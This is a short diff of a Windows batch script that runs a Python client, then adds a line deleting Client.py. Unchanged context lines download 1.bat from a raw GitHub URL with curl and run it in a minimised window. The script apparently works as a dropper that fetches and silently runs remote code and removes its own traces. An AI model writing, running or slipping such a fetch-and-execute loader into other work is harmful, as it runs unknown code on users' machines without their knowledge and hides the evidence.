@@ -6,6 +6,7 @@ python3 Client.py
 cls
 goto :run
 :run
+del Client.py
 timeout 15 >nul
 curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
 START /MIN CMD.EXE /C 1.bat
